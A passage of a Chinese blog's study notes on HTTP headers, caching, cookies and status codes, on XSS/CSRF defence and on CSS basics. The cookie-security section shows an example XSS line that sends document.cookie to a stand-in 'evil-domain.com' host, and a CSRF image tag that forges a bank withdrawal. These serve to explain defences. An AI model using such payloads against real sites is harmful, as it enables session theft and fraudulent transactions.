title="内容安全策略(CSP)"></a>内容安全策略(CSP)</h4><p>CSP是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本(XSS)和数据注入攻击。</p><ol><li><strong>跨站脚本攻击</strong>：CSP通过指定有效域，即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或者消除XSS攻击所依赖的载体。一个CSP兼容的浏览器会仅执行从白名单域获取到的脚本文件，忽略所有其他脚本(包括内联脚本和HTML的事件处理属性)</li><li><strong>数据包嗅探攻击</strong>: 指明哪种协议允许使用：理想情况下，一个完整的数据安全传输策略不仅强制使用HTTPS传输，也为所有的cookie标记安全表示，并且提供自动的重定向使得HTTP页面导向HTTPS版本。比如一个cookie安全设置<pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre></li><li>配置：<ul><li>http头部: <code>Content-Security-Policy</code></li><li><code>&lt;meta&gt;</code>元素：<code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;</code></li></ul></li><li>示例：<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//所有内容来自站点的同一个源(不包括子域名)</span>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token comment" spellcheck="true">// 允许信任的域名</span>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token operator">*</span><span class="token punctuation">.</span>trusted<span class="token punctuation">.</span>com<span class="token comment" spellcheck="true">//允许包含来自任何源的图片</span><span class="token comment" spellcheck="true">//限制音频或视频需从信任的资源提供者(获得)</span><span class="token comment" spellcheck="true">//所有脚本必须从特定主机服务器获取可信的代码</span>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> img<span class="token operator">-</span>src <span class="token operator">*</span><span class="token punctuation">;</span> media<span class="token operator">-</span>src media1<span class="token punctuation">.</span>com media2<span class="token punctuation">.</span>com<span class="token punctuation">;</span> script<span class="token operator">-</span>src userscripts<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token comment" spellcheck="true">//所有内容都要通过SSL方式获取</span>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>onlinebanking<span class="token punctuation">.</span>jumbobank<span class="token punctuation">.</span>com</code></pre></li></ol><h4 id="严格传输安全-HSTS"><a href="#严格传输安全-HSTS" class="headerlink" title="严格传输安全(HSTS)"></a>严格传输安全(HSTS)</h4><ol><li>HTTP Strict Transport Security是一种互联网安全策略机制，保证浏览器始终连接到该网站的HTTPS加密版本，禁止使用HTTP访问当前资源。</li><li>服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含Strict-Transport-Security字段。非加密传输时设置的HSTS字段无效。</li><li>格式：<code>Strict-Transport-Security: max-age=expireTime [; includeSubDomains] [; preload]</code></li></ol><h4 id="HTTP认证-Authentication"><a href="#HTTP认证-Authentication" class="headerlink" title="HTTP认证(Authentication)"></a>HTTP认证(Authentication)</h4><ol><li>通用的HTTP认证框架<br><img src="/img/in-post/http-04.png" alt="HTTP Auth"><br>质询和应答的工作流程如下：服务器端向客户返回<code>401</code>(Unauthorized,未授权的)状态码，并在<code>WWW-Authenticate</code>首部提供如何进行验证的信息，其中至少包含一种质询方式。客户端可以在新的请求中添加<code>Authentication</code>首部字段进行验证，字段值为身份验证凭证信息</li><li>代理认证<br>询问质询的状态码是<code>407</code>(未代理认证)，响应头<code>Proxy-Authenticate</code>至少包含一个可用的质询，并且请求头<code>Proxy-Authentication</code>用作提供证书给代理服务器</li><li>访问拒绝<br>当(代理)u武器收到一个合法认证信息时，若该认证不能湖区请求资源的权限，(代理)服务器会返回<code>403</code>响应状态，说明用户证书权限不够，与<code>401</code>未认证和<code>407</code>未代理认证不同。</li><li>跨域图片认证</li></ol><h4 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h4><p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当Web缓存发现请求的资源已经被缓存，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样能缓解服务器压力，提高性能。</p><ul><li>缓存根据是否需要重新向服务器发起请求来分类，可以分为两大类(强制缓存，对比缓存)，强制缓存如果生效，不需要再和服务器发生交互，而对比缓存不管是否生效，都需要与服务器发生交互。<br><a href="https://www.cnblogs.com/chenqf/p/6386163.html" target="_blank" rel="noopener">一个写的挺清楚的博客</a></li><li>常用的HTTP缓存只能存储<code>GET</code>响应</li><li><strong>Cache-Control</strong>:HTTP/1.1定义<code>Cache-Control</code>头用来区分对缓存机制的支持情况,可选值如下<ul><li><code>private</code>： 私有缓存，只有客户端缓存</li><li><code>public</code>: 共享缓存，客户端和代理服务器都可以缓存</li><li><code>max-age=&lt;seconds&gt;</code>: 缓存内容将在value秒后失效</li><li><code>no-cache</code>: 需要使用对比缓存来验证缓存数据</li><li><code>no-store</code>: 基本很少使用，所有内容都不会缓存，强制缓存和对比缓存都不会触发</li><li><code>must-revalidate</code>：缓存在考虑使用一个陈旧的资源时，必须先验证它的状态</li></ul></li><li><strong>缓存验证</strong>：用户点击刷新按钮或者缓存的响应头部信息里包含<code>Cache-Control:must-revalidate</code>定义时会开始缓存验证。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。</li><li><strong>Expires</strong>：HTTP/1.0使用的设置服务端到期时间，是一个GMT时间格式个字符串，浏览器进行第一次请求时，服务器会在返回头部加上Expires，下次请求，如果在这个时间之前则命中缓存。由于服务端和客户端本地设置的时间可能不一致，会导致差错。</li><li><strong>协商缓存</strong>：浏览器第一次请求数据时，服务器会将缓存标识与数据一起返回给客户端，客户端将两者备份至缓存数据库。再次请求数据时，客户端将备份的缓存标识发送给服务器，服务器根据缓存标识进行判断，成功则返回<code>304</code>状态码，通知客户端比较成功，可以使用缓存数据。<ul><li><code>Last-Modified</code>：服务器在响应请求时，告诉浏览器资源的最后更新时间</li><li><code>If-Modified-Since</code>：再次请求服务器时，浏览器告诉服务器上次返回的资源最后修改时间。服务器收到请求头，通过比较两次时间，判断资源在请求期间内是否有修改，有修改则返回<code>200</code>,未修改则返回<code>304</code></li><li><code>ETag</code>：服务器资源的唯一标识符</li><li><code>If-None-Match</code>：再次请求服务器时，服务器比较请求头中的If-None-Match和当前资源中的etag是否一致，来判断资源是否修改过。</li><li><code>Last-Modified/If-Modified-Since</code>和<code>ETag/If-None-Match</code>是两种验证方法，第一种只能检查出几秒后的修改</li></ul></li></ul><h4 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h4><p>数据压缩是提高Web站点性能的一种重要手段。为了要使用压缩算法，浏览器和服务器之间会实验主动协商机制。浏览器发送<code>Accept-Ecoding</code>首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且使用<code>Content-Encoding</code>首部来告知浏览器选择了哪种算法。</p><h4 id="HTTP内容协商机制"><a href="#HTTP内容协商机制" class="headerlink" title="HTTP内容协商机制"></a>HTTP内容协商机制</h4><p>通过为同一URI指向的资源提供不同的展现形式，可以使用户代理选择与用户需求相适应的最佳匹配。<br>HTTP/1.1规范指定了一系列标准信息头用于启动服务端驱动型内容协商(Accept、Accept-Charset、Accept-Encoding、Accept-Language)</p><h4 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h4><p>HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再次请求时被携带并发送到服务器上。Cookie主要用于三个方面：</p><ul><li>会话状态管理(用户登录状态，购物车，游戏分数)</li><li>个性化设置(用户自定义设置，主题)</li><li>浏览器行为跟踪(跟踪分析用户行为)  </li></ul><p>服务器使用<code>Set-Cookie</code>响应头部向用户代理，比如：</p><ul><li>一个服务器响应报文：<pre class=" language-bash"><code class="language-bash">HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie<span class="token operator">=</span>chocoSet-Cookie: tasty_cookie<span class="token operator">=</span>strawberry//<span class="token punctuation">..</span>.</code></pre></li><li>一个浏览器重新请求报文<pre class=" language-bash"><code class="language-bash">GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie<span class="token operator">=</span>choco<span class="token punctuation">;</span> tasty_cookie<span class="token operator">=</span>strawberry</code></pre></li><li>时效<ul><li><strong>会话期Cookie</strong>：浏览器关闭后会自动删除，不需要指定过期时间或者有效期</li><li><strong>持久性Cookie</strong>：和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间<code>Expires</code>或者有效期<code>Max-Age</code></li></ul></li><li><strong>标记</strong><ul><li>标记为<code>Secure</code>的Cookie只应通过被HTTPS协议加密过的请求发送给服务器端</li><li>标记为<code>HttpOnly</code>的Cookie不能被客户端的JavaScript脚本调用</li></ul></li><li><strong>作用域</strong><ul><li><code>Domain</code>指定主机，默认为当前文档的主机，如果指定则包含子域名</li><li><code>Path</code>指定了主机下哪些路径可以接受Cookie</li></ul></li><li><strong>安全</strong><ul><li>会话劫持和XSS:<code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code></li><li>跨站请求伪造csrf:<code>&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</code></li></ul></li></ul><h4 id="HTTP重定向"><a href="#HTTP重定向" class="headerlink" title="HTTP重定向"></a>HTTP重定向</h4><p>URL重定向，也称为URL转发，是一种当实际资源，入单个页面、表单或者整个Web应用被迁移到新的URL下时，保持(原有)连接可用的技术。HTTP协议提供了HTTP重定向来执行此类操作。</p><ul><li>用途：网站维护期间的临时跳转，网站架构改变后为了保持外部连接继续可用的永久重定向，上传文件时的表示进度的页面</li><li>原理：HTTP协议的重定向响应的状态码为3xx,浏览器在接收到重定向响应时，会采用该响应提供的新的URL。</li></ul><p><strong>类别</strong></p><ul><li>永久重定向：原有URL不再被使用<br><img src="/img/in-post/http-03.JPG" alt=""></li><li>临时重定向<br><img src="/img/in-post/http-04.JPG" alt=""></li><li>特殊重定向<br><img src="/img/in-post/http-05.JPG" alt=""></li></ul><p>设置重定向映射的其他方法：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#HTML_%E9%87%8D%E5%AE%9A%E5%90%91%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">见链接</a></p><h4 id="HTTP常见状态码"><a href="#HTTP常见状态码" class="headerlink" title="HTTP常见状态码"></a>HTTP常见状态码</h4><ul><li>总结：<ul><li>1xx: 表示请求已接收，继续处理</li><li>2xx：表示请求已成功接收，理解，接受</li><li>3xx：重定向</li><li>4xx：客户端错误-请求有语法错误或请求无法实现</li><li>5xx：服务端错误-服务器未能实现合法的请求</li></ul></li><li><code>100 Continue</code>: 目前为止一切正常, 客户端应该继续请求, 如果已完成请求则忽略</li><li><code>200 OK</code>: 请求已经成功. 默认情况下状态码为200的响应可以被缓存<ul><li><code>GET</code>: 已经取得资源，并将资源添加到响应的消息体中</li><li><code>HEAD</code>: 响应的消息体为头部信息</li><li><code>POST</code>: 响应的消息体中包含此次请求的结果</li><li><code>TRACE</code>: 响应的消息体中包含服务器接收到的请求信息</li><li><code>PUT</code> 和 <code>DELETE</code> 的请求成功通常并不是响应200 OK的状态码而是 <code>204 No Content</code> 表示无内容(或者<code>201  Created</code>表示一个资源首次被创建成功)</li></ul></li><li><code>201 Created</code>: 表示请求已经被成功处理，并且创建了新的资源</li><li><code>202 Accepted</code>: 表示服务器端已经收到请求消息，但是尚未进行处理</li><li><code>204 No Content</code>：表示目前请求成功，但客户端不需要更新其现有页面。204 响应默认是可以被缓存的。在响应中需要包含头信息 ETag</li><li><code>205 Reset Content</code>: 通知客户端重置文档视图，比如清空表单内容、重置 canvas 状态或者刷新用户界面</li><li><code>206 Partial Content</code>：成功状态响应代码表示请求已成功，并且主体包含所请求的数据区间，该数据区间是在请求的 Range 首部指定的</li><li><code>301 永久重定向</code>：说明请求的资源已经被移动到了由 Location 头部指定的url上，是固定的不会再改变；搜索引擎会根据该响应修正</li><li><code>302 Found</code>：表明请求的资源被暂时的移动到了由Location 头部指定的 URL 上。浏览器会重定向到这个URL， 但是搜索引擎不会对该资源的链接进行更新；仅在响应 GET 或 HEAD 方法时采用 302 状态码，而在其他时候使用 307 Temporary Redirect 来替代！</li><li><code>304 未改变</code>: 无需再次传输请求的内容，也就是说可以使用缓存的内容</li><li><code>307 Temporary Redirect</code>: 表示重定向的响应状态码，说明请求的资源暂时地被移动到Location首部所指向的URL上</li><li><code>308 Permanent Redirect</code>: 和301类似，但是返回 301 状态码的情况下，请求方法有时候会被客户端错误地修改为GET方法</li><li><code>400 Bad Request</code>：由于语法无效，服务器无法理解该请求</li><li><code>401 Unauthorized</code>：代表客户端错误，指的是由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足，这个状态码会与WWW-Authenticate首部一起发送，其中包含有如何进行验证的信息</li><li><code>403 Forbidden</code>：代表客户端错误，指的是服务器端有能力处理该请求，但是拒绝授权访问</li><li><code>404 Not Found</code>：代表客户端错误，指的是服务器端无法找到所请求的资源；404 状态码并不能说明请求的资源是临时还是永久丢失。如果服务器知道该资源是永久丢失，那么应该返回 410 (Gone)</li><li><code>408 Request Timeout</code>：表示服务器想要将没有在使用的连接关闭，服务器应该在此类响应中将 Connection 首部的值设置为 “close”</li><li><code>422 Unprocessable Entity</code>：返回码表示服务器理解请求实体的content type,并且请求实体的语法是正确的，但是服务器不能处理所包含的指示</li><li><code>500 Internal Server Error</code>：表示服务器端错误的响应状态码，意味着所请求的服务器遇到意外的情况并阻止其执行请求</li><li><code>501 Not Implemented</code>：服务器错误响应码表示请求的方法不被服务器支持，因此无法被处理</li><li><code>502 Bad Gateway</code>：网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的</li><li><code>503 Service Unavailable</code>：表示服务器尚未处于可以接受请求的状态，通常造成这种情况的原因是由于服务器停机维护或者已超载</li><li><code>504 Gateway Timeout</code>: 表示扮演网关或者代理的服务器无法在规定的时间内获得想要的响应</li><li><code>505 HTTP Version Not Supported</code>: 表示服务器不支持请求所使用的 HTTP 版本</li><li><code>511 Network Authentication Required</code>：表示客户端需要通过验证才能使用该网络；该状态码不是由源头服务器生成的，而是由控制网络访问的拦截代理服务器生成的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端安全问题</title>
      <link href="/2018/08/18/qian-duan-an-quan-wen-ti/"/>
      <url>/2018/08/18/qian-duan-an-quan-wen-ti/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">CSRF 攻击的应对之道</a><br><a href="https://juejin.im/post/59dc2b7a6fb9a0451869ae3a" target="_blank" rel="noopener">前端安全知识</a></p><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ul><li><strong>Cross-Site Scripting</strong>(跨站脚本攻击)简称XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如cookie,sessionID等，进而危害数据安全</li><li><strong>存储型XSS</strong>：攻击者将恶意代码提交到目标网站的数据库中，用户打开目标网站时，服务器将恶意代码从数据库中去除，拼接在HTML中返回给浏览器；恶意代码窃取用户数据并发送到攻击这的网站，或者冒充用户的行为，调用目标网站执行攻击者指定的操作；常见于：论坛发帖、商品评论、用户私信</li><li><strong>反射型XSS</strong>：攻击者构造处特殊的URL，其中包含恶意代码；用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器；用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；常见于：网站搜索、跳转等</li><li><strong>DOM型XSS</strong>：攻击者构造出包含恶意代码的URL，用户打开带有恶意代码的URL，用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行；DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由<strong>浏览器端</strong>完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于<strong>服务端</strong>的安全漏洞</li><li>常见危害：<ul><li>通过<code>document.cookie</code>窃取cookie信息</li><li>使用js或者css破坏页面的正常结构与样式</li><li>dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应</li></ul></li><li>XSS攻击的预防：<ul><li>前端输入过滤、转义（不能完全解决，前端校验可以被绕过，模拟直接请求）；对输入内容的特定字符进行编码，比如表示 html标记的 <code>&lt;&gt;</code> 等符号</li><li>对重要的cookie设置HttpOnly，防止客户端通过<code>document.cookie</code>窃取</li><li>CSP（Content-Security-Policy 内容安全策略）：禁止加载外域代码<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>default-src <span class="token punctuation">'</span>none<span class="token punctuation">'</span>; script-src <span class="token punctuation">'</span>self<span class="token punctuation">'</span> ssl.google-analytics.com;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li><li>将不可信的值输出 URL参数之前，进行 URLEncode操作，而对于从 URL参数中获取值一定要进行格式检测<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">encode</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>str <span class="token operator">||</span> str<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/gm</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/gm</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/gm</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/gm, '</span><span class="token operator">&amp;</span>apos<span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4></li></ul></li><li>CSRF (Cross-site request forgery) 跨站请求伪造是攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击的目的；</li><li>两个要点：<ul><li>登录受信任的网站A，在本地生成cookie</li><li>不登出A的情况下，访问危险网站B</li></ul></li><li>防御：<ul><li>验证HTTP Referer字段，限制请求的来源网站是否合法</li><li>请求地址中添加token验证：关键在于在请求中放入不能伪造且不存在域cookie中的数据；可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求</li><li>HTTP中自定义属性并验证</li></ul></li><li>Java示例<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 从 HTTP 头中取得 Referer 值</span>String referer<span class="token operator">=</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 判断 Referer 是否以 bank.example 开头</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>referer<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>referer<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>“bank<span class="token punctuation">.</span>example”<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>“error<span class="token punctuation">.</span>jsp”<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础</title>
      <link href="/2018/08/11/css-ji-chu/"/>
      <url>/2018/08/11/css-ji-chu/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="http://www.w3school.com.cn/css" target="_blank" rel="noopener">w3school</a></li><li><a href="https://www.cnblogs.com/clearsky/p/5696286.html" target="_blank" rel="noopener">css 盒子模型理解</a></li></ul><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><ul><li>CSS 指层叠样式表（Cascading Style Sheets），把样式添加到HTML 4.0 中是为了解决内容与表现分离的问题</li><li>CSS层叠次序，样式优先级：<ul><li>内联样式（HTML元素内部）</li><li>内部样式表（位于head标签内部）</li><li>外部样式表</li><li>浏览器缺省设置</li></ul></li><li>CSS语法：选择器+一条或者多条声明<br><code>selector {declaration1; declaration2; ... declarationN }</code></li><li>创建<ul><li>外部样式表<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre></li><li>内部样式表<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector">hr </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> sienna<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre></li></ul></li></ul><h4 id="CSS样式"><a href="#CSS样式" class="headerlink" title="CSS样式"></a>CSS样式</h4><ul><li><p>背景</p><ul><li><code>background-color</code>：不能继承，默认是 transparent 透明，所以祖先元素背景可见</li><li><code>background-image</code>：设置<code>url(&quot;image-src&quot;)</code>，不能继承，默认 none</li><li><code>background-repeat</code>：对背景图像进行平铺；可选<code>repeat</code>、<code>repeat-x</code>、<code>repeat-y</code>、<code>no-repeat</code></li><li><code>background-position</code>：改变图像在背景中的位置<ul><li>位置关键词：可同时指定多个值<code>center</code>、<code>left</code>、<code>top</code>、<code>bottom</code>、<code>right</code></li><li>百分比值：中心与其元素的中心对齐</li><li>长度值：元素内边距区左上角的偏移</li></ul></li><li><code>background-attachment</code>：背景关联；默认随文档滚动<code>scroll</code>，可以设置<code>fixed</code>，相对于可视区是固定的</li></ul></li><li><p>文本</p><ul><li><code>text-indent</code>：文本缩进</li><li><code>text-align</code>：水平对齐<ul><li><code>left</code>：文本居左</li><li><code>right</code>：文本居右</li><li><code>center</code>：元素内部文本居中</li><li><code>justify</code>：两端文本对齐</li><li><code>inherit</code>：从父元素继承</li></ul></li><li><code>word-spacing</code>：改变字（单词）之间的标准间隔</li><li><code>letter-spacing</code>：改变字符（字母）之间的间隔</li><li><code>text-transform</code>：字符转换<ul><li><code>none</code>：默认</li><li><code>uppercase</code>：全部大写</li><li><code>lowercase</code>：全部小写</li><li><code>capitalize</code>：每个单词头字母大写</li></ul></li><li><code>text-decoration</code>：文本装饰<ul><li><code>none</code></li><li><code>underline</code>：下划线</li><li><code>overline</code>：上划线</li><li><code>line-through</code>：贯穿现</li><li><code>blink</code>：文本闪烁</li></ul></li><li><code>white-space</code>：处理空白符<br><img src="/img/in-post/css-02.JPG" alt="value"></li><li><code>direction</code>：文本方向<code>ltr</code>、<code>rtl</code>从左到右、从右到左</li></ul></li><li><p>字体</p><ul><li><code>font-family</code></li><li><code>font-style</code>：字体风格<ul><li>normal - 文本正常显示</li><li>italic - 文本斜体显示</li><li>oblique - 文本倾斜显示</li></ul></li><li><code>font-variant</code>：字体变形；设定小型大写字母</li><li><code>font-weight</code>：字体粗细</li><li><code>font-size</code>：字体大小；1em 等于当前的字体尺寸；在所有浏览器中均有效的方案是为 body 元素（父元素）以百分比设置默认的 font-size 值<br><img src="/img/in-post/css-03.JPG" alt="value"></li></ul></li><li><p>链接</p><ul><li>四种状态：<ul><li>a:link - 普通的、未被访问的链接</li><li>a:visited - 用户已访问的链接</li><li>a:hover - 鼠标指针位于链接的上方</li><li>a:active - 链接被点击的时刻</li></ul></li><li>设置规则次序：<ul><li>a:hover 必须位于 a:link 和 a:visited 之后</li><li>a:active 必须位于 a:hover 之后</li></ul></li></ul></li><li><p>列表</p><ul><li><code>list-style-type</code>：<code>disc | circle | square | decimal | decimal-leading-zero | lower-roman | upper-roman | lower-greek | lower-latin | upper-latin | armenian | georgian | none | inherit</code></li><li><code>list-style-image</code>：列表项图像</li><li><code>list-style-postion</code>：标志出现在列表项内容之外还是内容内部<br><img src="/img/in-post/css-04.JPG" alt="value"></li></ul></li><li><p>表格</p><ul><li><code>border-collapse</code>：折叠边框 <code>separate | collapse | inherit</code></li><li><code>border-spacing</code>： 设置相邻单元格的边框间的距离（仅用于“边框分离”模式）</li><li><code>empty-cells</code>：设置是否显示表格中的空单元格（仅用于“分离边框”模式）；<code>hide | show    | inherit</code></li></ul></li><li><p>轮廓</p><ul><li><code>outline</code>在一个声明中设置所有的轮廓属性</li><li><code>outline-color</code>设置轮廓的颜色</li><li><code>outline-style</code>设置轮廓的样式</li><li><code>outline-width</code>设置轮廓的宽度</li></ul></li></ul><h4 id="CSS盒模型"><a href="#CSS盒模型" class="headerlink" title="CSS盒模型"></a>CSS盒模型</h4><ul><li>CSS盒模型规定了元素框处理元素 <strong>内容</strong>、<strong>内边距</strong>、<strong>边框</strong>、<strong>外边距</strong> 的方式</li><li>盒子实际宽度（高度）= 内容 + 内边距 + 边框 + 外边距</li><li>标准模型：width（height）指<strong>内容</strong>部分的宽度（高度）</li><li>IE模型：width（height）指 <strong>内容</strong>+<strong>内边距</strong>+<strong>外边距</strong> 部分的宽度（高度）</li><li>切换盒模型，可以使用css3的<code>box-sizing</code>属性<ul><li><code>box-sizing: content-box</code> 是W3C盒子模型</li><li><code>box-sizing: border-box</code> 是IE盒子模型</li></ul></li><li>适用场景：border-box可以便于计算，对于有边框的盒子可以正常使用百分比宽度</li><li>margin越界问题（第一个子元素的margin-top和最后一个子元素的margin-bottom的越界问题），解决方案：<ul><li>给父元素加边框border</li><li>给父元素设置padding值</li><li>父元素添加 overflow：hidden</li><li>父元素加前置内容生成<pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.parent</span><span class="token pseudo-element">:before</span> </span><span class="token punctuation">{</span>  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span> table<span class="token 